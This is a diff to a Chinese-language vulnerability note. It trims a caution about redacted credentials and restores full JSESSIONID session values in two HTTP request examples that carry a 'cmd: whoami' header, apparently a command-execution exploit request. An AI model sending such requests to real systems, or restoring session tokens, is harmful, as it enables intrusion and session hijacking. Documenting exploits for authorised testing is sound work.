@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -78,7 +78,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
 cmd: whoami
-Cookie: JSESSIONID=95B
+Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
 Connection: close
 ```
 
@@ -105,7 +105,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
 cmd: whoami
-Cookie: JSESSIONID=95B
+Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
 Connection: close
 ```
 
